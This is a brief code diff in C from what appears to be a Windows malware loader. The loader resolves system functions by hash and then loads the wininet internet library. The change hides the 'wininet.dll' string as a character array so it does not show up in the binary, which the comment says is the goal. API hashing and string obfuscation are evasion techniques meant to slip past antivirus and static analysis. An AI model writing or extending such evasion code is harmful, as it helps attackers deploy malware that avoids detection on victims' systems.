@@ -26,8 +26,10 @@ BOOL InitWininetStruct(OUT PWININET_STRUCT St) {
     fnLoadLibraryA pLoadLibraryA = (fnLoadLibraryA)GetProcAddressH(hKernel32, LoadLibraryA_HASH); 
     
     // Get module wininet.dll
-    // TODO: Replace with custom LoadLibraryH function that takes the hash instead
-    HMODULE hWininet = pLoadLibraryA("wininet.dll"); 
+    // Potential TODO: Replace with custom LoadLibraryH function that takes the hash instead
+    // Alternative: Initialze the wininet.dll string as character array to have it not show up in the binary metadata
+    char szWininet[] = { 'w', 'i', 'n', 'i', 'n', 'e', 't', '.', 'd', 'l', 'l', '\0' }; 
+    HMODULE hWininet = pLoadLibraryA(szWininet); 
 
     // Populate struct members with API addresses
     St->pInternetOpenW = (fnInternetOpenW)GetProcAddressH(hWininet, InternetOpenW_HASH); 
